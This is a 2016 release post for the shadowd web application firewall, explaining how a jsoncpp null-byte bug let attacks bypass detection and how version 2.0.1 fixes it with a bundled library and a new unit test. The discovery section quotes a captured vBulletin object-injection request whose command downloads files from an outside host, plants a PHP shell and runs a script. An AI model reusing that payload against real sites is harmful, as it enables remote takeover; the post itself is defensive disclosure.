+++
title = "Release of shadowd 2.0.1"
description = ""
tags = [
    "release",
    "shadowd",
    "bugfix",
]
date = "2016-03-06"
categories = [
    "Development",
    "Shadow Daemon",
]
menu = "main"
url = "/release-shadowd_2.0.1/"
aliases = [
    "/post/shadowd_2.0.1/",
]
author = "Hendrik Buchwald"
+++

**TL;DR:** There was a bug in the library *jsoncpp* regarding null-bytes. It was fixed a year ago, but most packet managers still ship affected versions. If a vulnerable version of the library is used it is possible to bypass shadowd 2.0.0 or earlier.

<!--more-->

## Discovery of the bug

I operate a large amount of [honeypots](https://shadowd.zecure.org/tutorials/honeypots/) to observe and study attacks on web applications. Recently I noticed that one of the web applications (vBulletin 5.1.2) was successfully compromised, but strangely enough the attack was not detected by Shadow Daemon. So I started recording everything and a little bit later I saw a request with the following resource.

    /ajax/api/hook/decodeArguments?arguments=O:12:%22vB_dB_Result%22:2:%7Bs:5:%22%00*%00db%22;O:18:%22vB_Database_MySQLi%22:1:%7Bs:9:%22functions%22;a:1:%7Bs:11:%22free_result%22;s:6:%22system%22;%7D%7Ds:12:%22%00*%00recordset%22;s:151:%22wget%20http://augsburg-auto.ru/files/vb.txt;mv%20vb.txt%20simple.php;cd%20/tmp;wget%20http://augsburg-auto.ru/files/SQL.txt;mv%20SQL.txt%20bash;perl%20bash;rm%20-rf%20SQL*%22;%7D

The parameter *arguments* contains a serialized PHP object and an URL, so this should result in a blacklist impact of 6. More than enough to trigger the alarm, but it did not. After looking at the recorded parameters it was pretty obvious why: *arguments* was cut off after the first null-byte (*%00*), so it was incomplete and did not trigger any filters at all.

    O:12:"vB_dB_Result":2:{s:5:" 

This seemed odd to me, considering that shadowd uses *std::string*. Unlike char arrays the C++ standard library strings are not terminated by null-bytes, so this should not have happened. I started debugging shadowd and noticed that strings were cut off by jsoncpp when decoding client input with null-bytes. As a result of that all security checks in shadowd used the incomplete versions, even though they could handle null-bytes perfectly fine themselves.

After some digging I found [this](https://sourceforge.net/p/jsoncpp/patches/18/) ticket in the jsoncpp bug tracker. The problem with null-bytes was already reported and fixed *exactly* a year ago (now that is a nice coincidence). So why was this problem still happening? Because most packet managers install versions of jsoncpp that are much older than a year.

## The bug fix

The new version of shadowd ships with jsoncpp. The source of the library is directly compiled into the binary. This is the only (usable) way to ensure that shadowd is not affected by the problem, because it might take years until most packet managers update their versions of jsoncpp. On a positive note, this means there is one dependency less required to install shadowd.

So make sure to update to shadowd 2.0.1 as fast as possible to apply this patch.

## Precautionary measures

To prevent this problem from happening again (e.g., when updating the json lib) there is a new test case for null-bytes.

    BOOST_AUTO_TEST_CASE(nullbyte_decode) {
        swd::request_ptr request(new swd::request);
        swd::request_handler request_handler(request, swd::cache_ptr(), swd::storage_ptr());

        request->set_content("{\"version\":\"\",\"client_ip\":\"\",\"caller\":\"\","
         "\"resource\":\"foo\\u0000bar\",\"input\":{},\"hashes\":{}}");
        BOOST_CHECK(request_handler.decode() == true);

        std::stringstream expected;
        expected << "foo" << '\0' << "bar";
        BOOST_CHECK(request->get_resource() == expected.str());
    }

## Lessons learned

The lesson I learned (again) today is to not trust anyone or anything. Even though shadowd could handle null-bytes fine, one of its dependencies could not. The same could be true for web applications you are developing or using yourself. Even if the actual code of the application does not contain bugs, are you certain that there are no bugs in the dozens of libraries the application is using? So better be prepared and protect your applications!
